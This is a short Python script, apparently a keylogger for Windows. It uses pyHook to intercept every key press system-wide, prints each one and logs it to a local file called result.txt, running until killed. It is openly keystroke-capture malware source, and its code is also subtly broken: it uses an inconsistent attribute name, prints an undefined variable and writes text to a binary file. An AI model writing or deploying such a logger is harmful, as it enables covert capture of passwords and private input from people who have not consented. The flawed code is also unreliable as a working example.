import pythoncom, pyHook

f = open("result.txt", "wb")

def OnKeyboardEvent(event):
    try:
        print("key: ", event.Key)
        f.write(event.key)
    except:
        print("Error: ", exception)

# return True to pass th event to other handlers
    return True

# create a hook manager
hm = pyHook.HookManager()
# watch for all events
hm.KeyDown = OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()

f.close()